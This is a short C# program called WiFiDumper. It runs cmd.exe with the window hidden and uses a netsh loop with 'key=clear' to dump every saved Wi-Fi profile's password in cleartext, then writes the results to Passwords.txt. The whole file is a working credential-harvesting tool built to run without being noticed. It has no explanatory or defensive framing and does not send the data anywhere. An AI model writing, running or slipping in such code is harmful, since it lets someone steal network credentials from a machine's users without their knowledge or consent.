using System.Diagnostics;
using System.IO;

namespace WiFiDumper
{
    internal abstract class Program
    {
        private static void Main()
        {
            var text = GetPass();
            File.WriteAllText(Directory.GetCurrentDirectory() + "\\Passwords.txt", text); }

        private static string GetPass()
        {
            const string text = "/c for /f \"skip=9 tokens=1,2 delims=:\" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear";
            var process = new Process();
            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.Arguments = text;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.RedirectStandardInput = true;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.CreateNoWindow = true;
            process.Start();
            var text2 = process.StandardOutput.ReadToEnd();
            process.StandardError.ReadToEnd();
            process.WaitForExit();
            return text2;
        }
    }
}